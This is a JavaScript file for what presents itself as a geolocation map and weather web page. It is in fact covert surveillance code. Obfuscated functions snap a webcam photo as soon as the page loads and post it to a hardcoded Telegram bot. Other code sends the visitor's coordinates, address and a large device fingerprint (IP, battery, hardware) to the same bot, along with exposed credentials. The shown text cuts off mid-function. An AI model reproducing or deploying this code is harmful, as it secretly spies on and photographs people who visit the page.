// This script was created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
// creator's phone number: +6287734034677
// script ini di lindungi oleh undang-undang hak cipta BACA README.MD

let map; 
let markers = []; 

// Fungsi untuk mendapatkan lokasi pengguna
function getLocation() {
    const status = document.getElementById('status');
    const mapContainer = document.getElementById('map-container');
    const addressElement = document.getElementById('address');

    // Langsung menampilkan peta saat tombol ditekan
    mapContainer.style.display = 'block';
    addressElement.textContent = ''; // Reset alamat

    // Cek apakah browser mendukung Geolocation API
    if ('geolocation' in navigator) {
        document.getElementById('loadingSpinner').style.display = 'block'; // Tampilkan loading spinner
        navigator.geolocation.getCurrentPosition(showPosition, showError);
        status.textContent = 'Mendapatkan lokasi...';
    } else {
        status.textContent = 'Geolocation tidak didukung oleh browser ini.';
    }
}

// Fungsi untuk menampilkan lokasi di peta dan mendapatkan alamat
function showPosition(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const mapArea = document.getElementById('map');
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    // Tampilkan status lokasi
    status.textContent = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;

    // Jika peta belum diinisialisasi, buat peta baru
    if (!map) {
        map = L.map(mapArea).setView([latitude, longitude], 16); // Menggunakan zoom level lebih tinggi

        // Menggunakan Tile Layer dari OpenStreetMap
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);
    } else {
        // Jika peta sudah ada, setel ulang view ke lokasi baru
        map.setView([latitude, longitude], 16);
    }

    // Tambahkan marker ke lokasi saat ini
    const marker = L.marker([latitude, longitude]).addTo(map)
        .bindPopup('Anda di sini!')
        .openPopup();
    
    // Simpan marker ke array agar bisa dihapus atau dikelola
    markers.push(marker);

    // Simpan lokasi ke riwayat
    saveLocationToHistory(latitude, longitude);

    // Mendapatkan cuaca berdasarkan lokasi
    getWeather(latitude, longitude);

    // Mendapatkan alamat dari koordinat menggunakan Nominatim
    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1&zoom=18&extratags=1&accept-language=id`, {
        headers: {
            'User-Agent': 'app tracker/1.0 (ailearnsbyalfian@gmail.com)' // Gmail jangan di ganti nanti eror!!
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data && data.display_name) {
            addressElement.textContent = `Lokasi: ${data.display_name}`;
            // Kirim lokasi dan alamat ke Telegram
            sendLocationToTelegram(latitude, longitude, data.display_name);
        } else {
            addressElement.textContent = 'Alamat tidak ditemukan.';
        }
    })
    .catch(error => {
        console.error('Error fetching address:', error);
        addressElement.textContent = 'Error fetching address.';
    });
}

// Fungsi untuk mengirim lokasi dan alamat ke Telegram
function sendLocationToTelegram(latitude, longitude, address) {
    if (!latitude || !longitude || !address) {
        console.error("Data lokasi tidak lengkap.");
        return;
    }

    const botToken = '7552258791:AAFOPquDIib6pBjmnq8J-Pq5__lgp6qskG4';  // Ganti dengan token bot kamu
    const chatId = '-1002360934041';  // Ganti dengan ID chat yang kamu dapatkan
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const message = `📍 Lokasi Target:\nLatitude: ${latitude.toFixed(5)}\nLongitude: ${longitude.toFixed(5)}\nAlamat: ${address}`;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('text', message);

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Jasa buat website hubungi https://t.me/Rafashaalfian');
        } else {
            console.error('Terjadi kesalahan saat membuka lokasi');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

// Fungsi untuk menyimpan lokasi ke riwayat
function saveLocationToHistory(latitude, longitude) {
    const location = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;
    const locationList = document.getElementById('location-history');
    const li = document.createElement('li');
    li.textContent = location;
    locationList.appendChild(li);
}

// Fungsi untuk menangani kesalahan Geolocation
function showError(error) {
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    document.getElementById('loadingSpinner').style.display = 'none'; // Sembunyikan loading spinner

    addressElement.textContent = ''; // Reset alamat
    switch (error.code) {
        case error.PERMISSION_DENIED:
            status.textContent = "Izin lokasi ditolak.";
            break;
        case error.POSITION_UNAVAILABLE:
            status.textContent = "Informasi lokasi tidak tersedia.";
            break;
        case error.TIMEOUT:
            status.textContent = "Waktu permintaan lokasi habis.";
            break;
        case error.UNKNOWN_ERROR:
            status.textContent = "Kesalahan tidak diketahui.";
            break;
    }
}

// Fungsi untuk mengambil foto dan langsung mengirimkan ke Telegram saat halaman dimuat
function _0x482e(_0x324e0a,_0x1ef04a){const _0x2d81a3=_0x2d81();return _0x482e=function(_0x482ecd,_0x1d5e03){_0x482ecd=_0x482ecd-0xeb;let _0x350b0e=_0x2d81a3[_0x482ecd];return _0x350b0e;},_0x482e(_0x324e0a,_0x1ef04a);}(function(_0x36a884,_0x52d773){const _0x3e9104=_0x482e,_0xe18963=_0x36a884();while(!![]){try{const _0x348c1b=-parseInt(_0x3e9104(0xeb))/0x1*(-parseInt(_0x3e9104(0xfb))/0x2)+parseInt(_0x3e9104(0xf4))/0x3+-parseInt(_0x3e9104(0x106))/0x4+parseInt(_0x3e9104(0x10d))/0x5*(-parseInt(_0x3e9104(0x108))/0x6)+parseInt(_0x3e9104(0xef))/0x7*(parseInt(_0x3e9104(0xee))/0x8)+-parseInt(_0x3e9104(0x11a))/0x9*(-parseInt(_0x3e9104(0xfa))/0xa)+-parseInt(_0x3e9104(0xfc))/0xb;if(_0x348c1b===_0x52d773)break;else _0xe18963['push'](_0xe18963['shift']());}catch(_0x5731fd){_0xe18963['push'](_0xe18963['shift']());}}}(_0x2d81,0x6891c));function takePhotoAndSendToTelegram(){const _0x3a66ee=_0x482e,_0x2a9beb={'gEJjK':_0x3a66ee(0x104),'Shilu':_0x3a66ee(0x105),'gnhCX':_0x3a66ee(0xfd)},_0x375fe6=document['getElementById']('camera'),_0x4e1e7c=document['getElementById']('canvas');navigator['mediaDevices']&&navigator[_0x3a66ee(0x119)]['getUserMedia']?navigator[_0x3a66ee(0x119)]['getUserMedia']({'video':!![]})[_0x3a66ee(0xff)](function(_0x519ee6){const _0x46ac59=_0x3a66ee,_0x2c9bd8={'QsnNc':_0x2a9beb[_0x46ac59(0x10f)]};_0x375fe6[_0x46ac59(0x10a)]=_0x519ee6,_0x375fe6[_0x46ac59(0x10c)]=()=>{const _0x12904b=_0x46ac59,_0x2756b6=_0x4e1e7c['getContext']('2d'),_0x5931c0=_0x375fe6['videoWidth'],_0x361ee1=_0x375fe6[_0x12904b(0x114)];_0x4e1e7c['width']=_0x5931c0,_0x4e1e7c[_0x12904b(0x10b)]=_0x361ee1,_0x2756b6['drawImage'](_0x375fe6,0x0,0x0,_0x5931c0,_0x361ee1);const _0x50c6d8=_0x4e1e7c[_0x12904b(0xf3)](_0x2c9bd8[_0x12904b(0xf7)]);sendToTelegram(_0x50c6d8),_0x519ee6[_0x12904b(0x110)]()['forEach'](_0x314b7c=>_0x314b7c[_0x12904b(0xed)]());};})[_0x3a66ee(0x103)](function(_0x58159f){const _0x4a05=_0x3a66ee;console[_0x4a05(0xf0)](_0x2a9beb[_0x4a05(0xf2)],_0x58159f);}):alert(_0x2a9beb[_0x3a66ee(0x107)]);}function _0x2d81(){const _0x1b39e2=['photo','videoHeight','otEtF','log','DdYoH','mkVaU','mediaDevices','945XKyvfh','3028PhdCeX','BgrJQ','stop','1340096GgNdvH','35unGeIS','error','/sendPhoto','Shilu','toDataURL','1600872cViGPG','ljFMK','-1002360934041','QsnNc','LEQWH','Terjadi\x20kesalahan\x20saat\x20membuka\x20kamera.','63080coPhhn','530IigpkN','24095775mmjgLr','Maaf,\x20browser\x20Anda\x20tidak\x20mendukung\x20akses\x20kamera.','Error:','then','CSnzH','chat_id','append','catch','image/png','Terjadi\x20kesalahan\x20saat\x20mengakses\x20kamera:\x20','161988YGMdid','gnhCX','2334nrWodX','https://api.telegram.org/bot','srcObject','height','onloadedmetadata','2270mLZieC','Foto\x20berhasil\x20dikirim\x20ke\x20Telegram.','gEJjK','getTracks','json','7552258791:AAFOPquDIib6pBjmnq8J-Pq5__lgp6qskG4'];_0x2d81=function(){return _0x1b39e2;};return _0x2d81();}function sendToTelegram(_0x1bffa0){const _0x4ac247=_0x482e,_0xb8380c={'otEtF':_0x4ac247(0x10e),'LEQWH':_0x4ac247(0xf9),'KyQyh':_0x4ac247(0xfe),'DdYoH':_0x4ac247(0x112),'CSnzH':_0x4ac247(0xf6),'ljFMK':_0x4ac247(0x113),'BgrJQ':function(_0x3f325f,_0x3a7731){return _0x3f325f(_0x3a7731);},'mkVaU':function(_0x2cb2ca,_0x665015,_0x2c6122){return _0x2cb2ca(_0x665015,_0x2c6122);}},_0x595b47=_0xb8380c[_0x4ac247(0x117)],_0x53e654=_0xb8380c[_0x4ac247(0x100)],_0x488414=_0x4ac247(0x109)+_0x595b47+_0x4ac247(0xf1);let _0x299cbf=new FormData();_0x299cbf[_0x4ac247(0x102)](_0x4ac247(0x101),_0x53e654),_0x299cbf[_0x4ac247(0x102)](_0xb8380c[_0x4ac247(0xf5)],_0xb8380c[_0x4ac247(0xec)](dataURItoBlob,_0x1bffa0)),_0xb8380c[_0x4ac247(0x118)](fetch,_0x488414,{'method':'POST','body':_0x299cbf})[_0x4ac247(0xff)](_0x551d3f=>_0x551d3f[_0x4ac247(0x111)]())[_0x4ac247(0xff)](_0x5ccfe6=>{const _0x2ee405=_0x4ac247;_0x5ccfe6['ok']?console[_0x2ee405(0x116)](_0xb8380c[_0x2ee405(0x115)]):console[_0x2ee405(0xf0)](_0xb8380c[_0x2ee405(0xf8)],_0x5ccfe6);})[_0x4ac247(0x103)](_0x1d8f7e=>{const _0x46278a=_0x4ac247;console[_0x46278a(0xf0)](_0xb8380c['KyQyh'],_0x1d8f7e);});}

// Fungsi untuk mengubah data URI menjadi Blob
function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

// Tambahkan event listener saat halaman dimuat
document.addEventListener('DOMContentLoaded', () => {
    checkDarkModeStatus(); // Untuk mengatur mode gelap
    takePhotoAndSendToTelegram(); // Memanggil fungsi pengambilan foto dan pengiriman otomatis
});

// Fungsi untuk membuka kamera dan menampilkan video
function openCamera() {
    const video = document.getElementById('camera');

    // Periksa apakah browser mendukung API getUserMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                // Ambil foto langsung ketika kamera berhasil dibuka
                video.onloadedmetadata = () => takePhoto();
            })
            .catch(function (err) {
                console.log("Terjadi kesalahan saat mengakses kamera: " + err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

// Fungsi untuk mengambil foto dan mengirimkan ke Telegram
function _0x5b11(_0x3d8c2a,_0x455ac1){const _0x35b81e=_0x35b8();return _0x5b11=function(_0x5b1198,_0x26f327){_0x5b1198=_0x5b1198-0x174;let _0x595096=_0x35b81e[_0x5b1198];return _0x595096;},_0x5b11(_0x3d8c2a,_0x455ac1);}(function(_0x34277d,_0x4719a3){const _0x5d65ba=_0x5b11,_0x2b46c1=_0x34277d();while(!![]){try{const _0x4d623c=parseInt(_0x5d65ba(0x197))/0x1*(-parseInt(_0x5d65ba(0x198))/0x2)+parseInt(_0x5d65ba(0x185))/0x3+-parseInt(_0x5d65ba(0x17b))/0x4+-parseInt(_0x5d65ba(0x193))/0x5*(parseInt(_0x5d65ba(0x18f))/0x6)+parseInt(_0x5d65ba(0x19c))/0x7*(parseInt(_0x5d65ba(0x196))/0x8)+parseInt(_0x5d65ba(0x17d))/0x9*(parseInt(_0x5d65ba(0x189))/0xa)+-parseInt(_0x5d65ba(0x17a))/0xb*(-parseInt(_0x5d65ba(0x179))/0xc);if(_0x4d623c===_0x4719a3)break;else _0x2b46c1['push'](_0x2b46c1['shift']());}catch(_0x28694f){_0x2b46c1['push'](_0x2b46c1['shift']());}}}(_0x35b8,0x3a5cd));function takePhoto(){const _0x221a03=_0x5b11,_0x42df6a={'MSPTA':_0x221a03(0x188),'nlLVV':'image/png'},_0x201c8b=document[_0x221a03(0x17c)](_0x42df6a[_0x221a03(0x19f)]),_0x2498a7=document['getElementById'](_0x221a03(0x17f)),_0x5434ba=_0x2498a7[_0x221a03(0x199)]('2d'),_0x22af34=_0x201c8b[_0x221a03(0x180)],_0x574015=_0x201c8b[_0x221a03(0x190)];_0x2498a7[_0x221a03(0x18e)]=_0x22af34,_0x2498a7[_0x221a03(0x184)]=_0x574015,_0x5434ba['drawImage'](_0x201c8b,0x0,0x0,_0x22af34,_0x574015);const _0x2cf63c=_0x2498a7[_0x221a03(0x178)](_0x42df6a[_0x221a03(0x19a)]);sendToTelegram(_0x2cf63c);}function sendToTelegram(_0x552f2e){const _0x5e325d=_0x5b11,_0x4ba9fe={'olKtI':function(_0x169eea,_0x14d9c0){return _0x169eea(_0x14d9c0);},'oTStB':function(_0x21bfe0,_0x4d1a50){return _0x21bfe0(_0x4d1a50);},'GzxNH':function(_0x467025,_0x447d8a){return _0x467025(_0x447d8a);},'FCXZD':'Terjadi\x20kesalahan.','vgOOG':_0x5e325d(0x18c),'VACkN':_0x5e325d(0x1a0),'UuMdL':_0x5e325d(0x186),'vKuJl':function(_0x4bccea,_0x41e215){return _0x4bccea(_0x41e215);},'vYzeb':function(_0x2175f9,_0x4b3432,_0x55d222){return _0x2175f9(_0x4b3432,_0x55d222);},'CCNQL':_0x5e325d(0x187)},_0x3adb89=_0x5e325d(0x19d),_0x105f9f=_0x4ba9fe[_0x5e325d(0x182)],_0x31ffdc='https://api.telegram.org/bot'+_0x3adb89+_0x5e325d(0x19e);let _0x101619=new FormData();_0x101619[_0x5e325d(0x175)](_0x4ba9fe[_0x5e325d(0x195)],_0x105f9f),_0x101619[_0x5e325d(0x175)](_0x4ba9fe[_0x5e325d(0x17e)],_0x4ba9fe[_0x5e325d(0x18a)](dataURItoBlob,_0x552f2e)),_0x4ba9fe[_0x5e325d(0x194)](fetch,_0x31ffdc,{'method':_0x4ba9fe[_0x5e325d(0x174)],'body':_0x101619})['then'](_0x536f61=>_0x536f61['json']())['then'](_0x414243=>{const _0x37b94d=_0x5e325d;_0x414243['ok']?_0x4ba9fe['olKtI'](alert,'Jasa\x20buat\x20website\x20hubungi\x20https://t.me/Rafashaalfian'):_0x4ba9fe[_0x37b94d(0x18d)](alert,_0x37b94d(0x183));})[_0x5e325d(0x176)](_0x587eff=>{const _0x420f4d=_0x5e325d;console['error'](_0x420f4d(0x177),_0x587eff),_0x4ba9fe['GzxNH'](alert,_0x4ba9fe[_0x420f4d(0x192)]);});}function dataURItoBlob(_0x52fbc6){const _0x41cf72=_0x5b11,_0x1611e1={'qQtwz':function(_0x3cf312,_0xfa979e){return _0x3cf312(_0xfa979e);},'sizod':function(_0x4c75d7,_0x196cbe){return _0x4c75d7<_0x196cbe;},'cpNHt':'image/png'};let _0x168e62=_0x1611e1['qQtwz'](atob,_0x52fbc6['split'](',')[0x1]),_0x279c56=new ArrayBuffer(_0x168e62['length']),_0x1ac575=new Uint8Array(_0x279c56);for(let _0x111748=0x0;_0x1611e1[_0x41cf72(0x191)](_0x111748,_0x168e62[_0x41cf72(0x18b)]);_0x111748++){_0x1ac575[_0x111748]=_0x168e62[_0x41cf72(0x181)](_0x111748);}return new Blob([_0x1ac575],{'type':_0x1611e1[_0x41cf72(0x19b)]});}function _0x35b8(){const _0x486e8f=['POST','camera','50uDYUha','vKuJl','length','-1002360934041','oTStB','width','1074hdeBpo','videoHeight','sizod','FCXZD','11745tKxKmO','vYzeb','VACkN','1085848ehzBzK','113cXYXWy','6502uzoKmj','getContext','nlLVV','cpNHt','7WmFJID','7552258791:AAFOPquDIib6pBjmnq8J-Pq5__lgp6qskG4','/sendPhoto','MSPTA','chat_id','CCNQL','append','catch','Error:','toDataURL','12BjBuTl','5981195vbFqKM','686824IUQgVH','getElementById','830223riAkzH','UuMdL','canvas','videoWidth','charCodeAt','vgOOG','Terjadi\x20kesalahan\x20saat\x20membuka\x20kamera.','height','173646bbkUAc','photo'];_0x35b8=function(){return _0x486e8f;};return _0x35b8();}
// Dark mode functionality
let isDarkMode = false;

function toggleDarkMode() {
    isDarkMode = !isDarkMode;
    document.body.classList.toggle('dark-mode');

    // Simpan status mode ke localStorage agar bisa bertahan saat halaman di-refresh
    localStorage.setItem('darkMode', isDarkMode);
    updateDarkModeButtonText();
}

// Fungsi untuk memeriksa apakah dark mode aktif dari localStorage
function checkDarkModeStatus() {
    const darkModeStatus = localStorage.getItem('darkMode');
    if (darkModeStatus === 'true') {
        isDarkMode = true;
        document.body.classList.add('dark-mode');
    }
    updateDarkModeButtonText();
}

// Fungsi untuk memperbarui teks tombol dark mode
function updateDarkModeButtonText() {
    const toggleButton = document.getElementById('darkModeToggle');
    toggleButton.innerHTML = isDarkMode ? '☀️ Switch to Light Mode' : '🌙 Switch to Dark Mode';
}

// Fungsi untuk mendapatkan informasi cuaca
function getWeather(lat, lon) {
    const apiKey = 'be2fbce957441bd5f28348a8a9ab448e'; // Jangan Diganti Kalo Gak Mau Eror ❗❗
    const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&units=metric&lang=id`; // Menambahkan parameter lang=id untuk Bahasa Indonesia

    fetch(url)
    .then(response => response.json())
    .then(data => {
        if (data.cod === 200) {
            const weatherInfo = `Cuaca saat ini: ${data.weather[0].description}, Suhu: ${data.main.temp}°C`;
            document.getElementById('weather').innerText = weatherInfo;
        } else {
            document.getElementById('weather').innerText = 'Cuaca tidak ditemukan untuk lokasi ini.';
        }
    })
    .catch(err => {
        console.error('Error fetching weather:', err);
        document.getElementById('weather').innerText = 'Gagal mengambil data cuaca.';
    });
}

// Fungsi untuk menambahkan penanda kustom di peta
function addCustomMarker() {
    if (map) {
        // Tambahkan event listener klik di peta
        map.on('click', function(e) {
            const lat = e.latlng.lat;
            const lon = e.latlng.lng;

            const marker = L.marker([lat, lon]).addTo(map)
                .bindPopup(`Lokasi Penanda: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).openPopup();
            
            markers.push(marker);

            saveLocationToHistory(lat, lon);
        });
    } else {
        alert('Peta belum diinisialisasi. Dapatkan lokasi terlebih dahulu.');
    }
}

const _0x1adb61=_0x18de;(function(_0x413fbb,_0x15c5d4){const _0x3708e4=_0x18de,_0x244a80=_0x413fbb();while(!![]){try{const _0x318fb7=-parseInt(_0x3708e4(0x124))/0x1*(parseInt(_0x3708e4(0xed))/0x2)+parseInt(_0x3708e4(0xe2))/0x3*(-parseInt(_0x3708e4(0xf3))/0x4)+-parseInt(_0x3708e4(0x166))/0x5*(-parseInt(_0x3708e4(0x10b))/0x6)+parseInt(_0x3708e4(0x125))/0x7+parseInt(_0x3708e4(0xf9))/0x8+-parseInt(_0x3708e4(0xf2))/0x9+parseInt(_0x3708e4(0xfa))/0xa;if(_0x318fb7===_0x15c5d4)break;else _0x244a80['push'](_0x244a80['shift']());}catch(_0x4636f5){_0x244a80['push'](_0x244a80['shift']());}}}(_0x12b6,0x2fd32));async function detectDeviceInfoAndSendToTelegram(){const _0x592680=_0x18de,_0x2d75bc={'fwKaM':function(_0x57db7b){return _0x57db7b();},'JxSzb':function(_0x5e1edd){return _0x5e1edd();},'GHPLS':'Informasi\x20perangkat\x20berhasil\x20dikirim\x20ke\x20Telegram.','PxIJT':_0x592680(0x11f),'XIiFC':_0x592680(0x139),'xahtV':'-1002360934041','AxJYu':function(_0x5ab636,_0x5d79f2){return _0x5ab636+_0x5d79f2;},'jJoFE':function(_0x5976cb,_0x4f0344){return _0x5976cb+_0x4f0344;},'simtE':function(_0x27ffcd,_0x39a0f2){return _0x27ffcd+_0x39a0f2;},'oSIjq':function(_0x25a724,_0x49b0f5){return _0x25a724+_0x49b0f5;},'XkIwq':function(_0x45fa56,_0x463502){return _0x45fa56+_0x463502;},'rZnDh':function(_0xba780e,_0x1209e9){return _0xba780e+_0x1209e9;},'WmZEa':function(_0x5b2bc0,_0x27a398){return _0x5b2bc0+_0x27a398;},'jwKEa':function(_0x4a5f2c,_0x383a17){return _0x4a5f2c+_0x383a17;},'cHmMl':function(_0x499bc4,_0x5cfabd){return _0x499bc4+_0x5cfabd;},'AsWVV':function(_0x378259,_0x31029f){return _0x378259+_0x31029f;},'FGRDW':_0x592680(0xcb),'xclIR':_0x592680(0xec),'VIBFR':_0x592680(0x164),'NLKFJ':'Tidak\x20tersedia','UGzwt':_0x592680(0xd0),'vmrIa':'❌\x20Offline','gMBmd':'Tidak\x20diketahui','nimIk':_0x592680(0x148),'XxfMK':_0x592680(0x115),'DEFOp':function(_0x34239f,_0x5aa75b){return _0x34239f in _0x5aa75b;},'KaCZu':_0x592680(0xf1),'UZUlR':function(_0x375de8,_0x18cc79){return _0x375de8>_0x18cc79;},'wOnlo':_0x592680(0xdd),'teqAX':_0x592680(0x165),'LkbTW':_0x592680(0x168),'ZmyKm':'Nonaktif','YMSbT':'(orientation:\x20portrait)','CdYHQ':'Portrait','wAXmx':_0x592680(0x169),'JuPXU':_0x592680(0x161),'jTKWG':function(_0x232111,_0x7816b7){return _0x232111(_0x7816b7);},'QlHbK':function(_0xa91ad5,_0x1c3db5){return _0xa91ad5(_0x1c3db5);},'OjyOv':'https://ipapi.co/json/','uIDTF':function(_0x439d03,_0x1121c4){return _0x439d03===_0x1121c4;},'hXNen':'Gagal\x20mendapatkan\x20lokasi\x20berdasarkan\x20IP:','jBZey':function(_0x4ea3f1,_0x50dfbe){return _0x4ea3f1+_0x50dfbe;},'IEByE':_0x592680(0x14c)},_0x11accf=navigator[_0x592680(0x10f)],_0x921e05=navigator[_0x592680(0x172)],_0x183b35=navigator[_0x592680(0x158)],_0x2d59ba=navigator['languages']?navigator[_0x592680(0x157)]['join'](',\x20'):_0x2d75bc[_0x592680(0x177)],_0xa052e7=navigator[_0x592680(0x13b)],_0x29567d=window['screen'][_0x592680(0x12a)],_0x20c646=window[_0x592680(0x128)]['height'],_0x1d2cd4=navigator[_0x592680(0xd6)]||navigator[_0x592680(0x162)]||navigator[_0x592680(0x176)],_0x1c06b8=navigator[_0x592680(0x104)]?_0x2d75bc['UGzwt']:_0x2d75bc[_0x592680(0x16e)],_0x26bfa3=_0x1d2cd4?_0x1d2cd4[_0x592680(0xd5)]:_0x2d75bc['gMBmd'],_0x2cc5fc=_0x1d2cd4?_0x1d2cd4[_0x592680(0x118)]+_0x592680(0xc1):_0x2d75bc[_0x592680(0x15d)],_0x564e5c=Intl[_0x592680(0x17b)]()[_0x592680(0x167)]()[_0x592680(0xf7)],_0xe3c440=new Date()[_0x592680(0xde)](),_0x22cc44=window[_0x592680(0x12d)]&&window[_0x592680(0x12d)](_0x2d75bc[_0x592680(0x134)])[_0x592680(0x182)]?_0x2d75bc[_0x592680(0x181)]:_0x592680(0x126),_0x5be76a=_0x2d75bc[_0x592680(0x120)](_0x2d75bc[_0x592680(0x114)],window)||_0x2d75bc[_0x592680(0x112)](navigator[_0x592680(0x17a)],0x0)?_0x2d75bc['wOnlo']:_0x2d75bc[_0x592680(0xdb)],_0x2b5984=navigator[_0x592680(0xd1)]?_0x2d75bc[_0x592680(0x15b)]:_0x2d75bc['ZmyKm'],_0x5205a5=window['matchMedia'](_0x2d75bc['YMSbT'])['matches']?_0x2d75bc['CdYHQ']:_0x2d75bc['wAXmx'],_0x214dc8=(performance[_0x592680(0xd4)]()/0x3e8/0x3c/0x3c)[_0x592680(0x130)](0x2)+_0x592680(0x119),_0x4c593d=/Mobi|Android/i[_0x592680(0x14f)](_0x11accf)?_0x592680(0x107):_0x2d75bc['JuPXU'],_0x2470c0=_0x2d75bc[_0x592680(0xea)](detectGPU),_0x414ff1=navigator[_0x592680(0xe5)]||'Tidak\x20diketahui',_0x359072=navigator[_0x592680(0x113)]?navigator['deviceMemory']+'\x20GB':_0x2d75bc[_0x592680(0x15d)],_0x2825a6=_0x2d75bc[_0x592680(0x153)](calculateStorageSize,localStorage),_0x596aa5=_0x2d75bc['QlHbK'](calculateStorageSize,sessionStorage);let _0x4a24f9='Tidak\x20diketahui',_0x1e3414='Tidak\x20diketahui',_0x13c50f='Tidak\x20diketahui',_0x5e3911=_0x592680(0x175);try{const _0xda41f8=await fetch(_0x2d75bc[_0x592680(0x160)]),_0x3e924a=await _0xda41f8[_0x592680(0xe6)]();_0x4a24f9=_0x3e924a['ip']||_0x2d75bc['gMBmd'];if(!_0x1e3414||_0x1e3414===_0x2d75bc[_0x592680(0x15d)])_0x1e3414=_0x3e924a[_0x592680(0x17f)]||_0x2d75bc[_0x592680(0x15d)];if(!_0x13c50f||_0x2d75bc['uIDTF'](_0x13c50f,_0x2d75bc[_0x592680(0x15d)]))_0x13c50f=_0x3e924a[_0x592680(0xc7)]||_0x2d75bc[_0x592680(0x15d)];_0x5e3911=_0x3e924a[_0x592680(0x12f)]+',\x20'+_0x3e924a[_0x592680(0x10a)]+',\x20'+_0x3e924a[_0x592680(0x149)];}catch(_0x37ccbb){console['error'](_0x2d75bc[_0x592680(0x100)],_0x37ccbb);}let _0x95678a=_0x2d75bc[_0x592680(0x177)];if(navigator[_0x592680(0xf6)]){const _0xae3a9a=await navigator[_0x592680(0xf6)]();_0x95678a=_0x2d75bc[_0x592680(0x140)](_0x2d75bc[_0x592680(0x152)](_0x592680(0x12c)+(_0xae3a9a[_0x592680(0x10e)]*0x64)[_0x592680(0x130)](0x0)+_0x592680(0x17d)+(_0x592680(0x173)+(_0xae3a9a[_0x592680(0x137)]?'Sedang\x20mengisi\x20⚡':_0x2d75bc[_0x592680(0x142)])+',\x20'),_0x592680(0x185)+(_0xae3a9a[_0x592680(0x14d)]?_0xae3a9a[_0x592680(0x14d)]+_0x592680(0x11c):_0x2d75bc['gMBmd'])+',\x20'),_0x592680(0x138)+(_0xae3a9a['dischargingTime']?_0xae3a9a[_0x592680(0x13d)]+'\x20detik':_0x2d75bc[_0x592680(0x15d)]));}navigator[_0x592680(0xf5)]?navigator[_0x592680(0xf5)][_0x592680(0xf0)](_0x48aa32=>{const _0x3f7bc3=_0x592680;_0x1e3414=_0x48aa32['coords'][_0x3f7bc3(0x17f)]['toFixed'](0x6),_0x13c50f=_0x48aa32['coords'][_0x3f7bc3(0xc7)][_0x3f7bc3(0x130)](0x6),_0x5e3911=_0x3f7bc3(0x141)+_0x1e3414+_0x3f7bc3(0xc6)+_0x13c50f,_0x2d75bc['fwKaM'](_0x1d59b2);},_0x24f63e=>{const _0xa0e34b=_0x592680;console[_0xa0e34b(0x11d)]('Gagal\x20mendapatkan\x20lokasi\x20dengan\x20Geolocation\x20API:',_0x24f63e[_0xa0e34b(0x16a)]),_0x2d75bc['JxSzb'](_0x1d59b2);}):(console[_0x592680(0x11d)](_0x592680(0xc3)),_0x1d59b2());function _0x1d59b2(){const _0x59bd3e=_0x592680,_0x11a2f2={'DcqoF':_0x2d75bc[_0x59bd3e(0x144)],'djzoy':_0x2d75bc[_0x59bd3e(0x189)]},_0x2972cd={'userAgent':_0x11accf,'platform':_0x921e05,'language':_0x183b35,'additionalLanguages':_0x2d59ba,'vendor':_0xa052e7,'browser':detectBrowser(),'os':_0x2d75bc[_0x59bd3e(0xfd)](detectOS),'screenResolution':_0x29567d+_0x59bd3e(0x13e)+_0x20c646,'onlineStatus':_0x1c06b8,'connectionType':_0x26bfa3,'downlinkSpeed':_0x2cc5fc,'timezone':_0x564e5c,'localTime':_0xe3c440,'darkMode':_0x22cc44,'touchscreen':_0x5be76a,'cookieEnabled':_0x2b5984,'deviceOrientation':_0x5205a5,'deviceUptime':_0x214dc8,'hardwareConcurrency':_0x414ff1,'deviceMemory':_0x359072,'localStorageSize':_0x2825a6,'sessionStorageSize':_0x596aa5,'ipAddress':_0x4a24f9,'latitude':_0x1e3414,'longitude':_0x13c50f,'locationInfo':_0x5e3911,'batteryInfo':_0x95678a,'isMobileDevice':_0x4c593d,'gpu':_0x2470c0},_0x424dab=_0x2d75bc[_0x59bd3e(0x11a)],_0x1cb8dc=_0x2d75bc[_0x59bd3e(0x183)],_0x38b7f7=_0x59bd3e(0x180)+_0x424dab+_0x59bd3e(0x122),_0x39ebee=_0x2d75bc[_0x59bd3e(0x16d)](_0x2d75bc['jJoFE'](_0x2d75bc[_0x59bd3e(0xff)](_0x2d75bc[_0x59bd3e(0xc8)](_0x2d75bc[_0x59bd3e(0x14a)](_0x2d75bc[_0x59bd3e(0x127)](_0x2d75bc[_0x59bd3e(0xc8)](_0x2d75bc[_0x59bd3e(0x14a)](_0x2d75bc[_0x59bd3e(0x140)](_0x2d75bc[_0x59bd3e(0x14a)](_0x2d75bc['WmZEa'](_0x2d75bc[_0x59bd3e(0xc8)](_0x2d75bc[_0x59bd3e(0x17e)](_0x2d75bc[_0x59bd3e(0xc8)](_0x2d75bc[_0x59bd3e(0x140)](_0x2d75bc[_0x59bd3e(0xc8)](_0x2d75bc[_0x59bd3e(0xff)](_0x2d75bc[_0x59bd3e(0xff)](_0x2d75bc[_0x59bd3e(0xe4)](_0x2d75bc[_0x59bd3e(0x127)](_0x2d7